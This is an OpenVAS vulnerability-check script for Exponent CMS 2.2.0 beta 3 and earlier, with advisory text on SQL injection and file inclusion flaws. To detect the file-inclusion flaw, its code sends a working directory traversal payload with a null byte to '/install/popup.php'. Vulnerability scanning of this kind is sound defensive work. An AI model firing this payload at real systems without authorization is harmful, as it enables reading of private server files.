###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_exponent_cms_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Exponent CMS Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary SQL
  commands or include arbitrary PHP files from the local system using directory
  traversal sequences with URL-encoded NULL byte, read arbitrary files or execute
  arbitrary PHP code on the target system.
  Impact Level: Application";

tag_affected = "Exponent CMS version 2.2.0 beta 3 and prior";
tag_insight = "Multiple flaws due to,
  - Insufficient filtration of 'src' and 'username' HTTP GET parameters passed
    to '/index.php' script. A remote unauthenticated attacker can execute
    arbitrary SQL commands in application's database.
  - Improper filtration of user-supplied input passed via the 'page' HTTP GET
    parameter to '/install/popup.php' script.";
tag_solution = "Update to Exponent CMS 2.2.0 Release Candidate 1 or later,
  For updates refer to http://www.exponentcms.org";
tag_summary = "This host is installed with Exponent CMS and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(803702);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-3294", "CVE-2013-3295");
  script_tag(name:"cvss_base", value:"7.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-05-23 14:56:02 +0530 (Thu, 23 May 2013)");
  script_name("Exponent CMS Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/93448");
  script_xref(name : "URL" , value : "http://www.osvdb.org/93447");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/May/57");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121643");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23154");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/526609");
  script_xref(name : "URL" , value : "http://forums.exponentcms.org/viewtopic.php?f=16&amp;t=789");
  script_xref(name : "URL" , value : "http://www.exponentcms.org/news/release-candidate-1-v2-2-0-set-loose");

  script_description(desc);
  script_summary("Check if Exponent CMS is vulnerable to file reading vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
url = "";
port = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/exponent", "/cms", cgi_dirs()))
{
  ## Request for the search.cgi
  sndReq = http_get(item:string(dir, "/index.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  ## confirm the Application
  if(rcvRes && ">Exponent CMS" >< rcvRes && "EXPONENT.LANG" >< rcvRes)
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct directory traversal attack
      url = dir + "/install/popup.php?page=" + crap(data:"../",length:3*15) +
            files[file] + "%00";

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        security_hole(port);
        exit(0);
      }
    }
  }
}
